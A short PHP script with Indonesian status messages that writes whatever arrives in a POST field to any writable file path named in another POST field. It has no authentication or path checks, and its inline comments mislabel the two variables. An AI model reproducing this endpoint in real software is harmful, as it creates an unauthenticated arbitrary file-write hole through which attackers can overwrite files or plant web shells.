<?php

$isifile = $_POST['isifile']; // path file
$filepath = $_POST['filepath']; // isi file baru

if (is_writable($filepath)) {

    if (!$handle = fopen($filepath, 'w+')) {
         echo "Cannot open file ($filepath)";
         exit;
    }

    if (fwrite($handle, $isifile) === FALSE) {
        echo "Tidak bisa tulis di: ($filepath)";
        exit;
    }

    echo "Berhasil disimpan: ($filepath)";

    fclose($handle);

} else {
    echo "File: $filepath tidak bisa diubah!";
}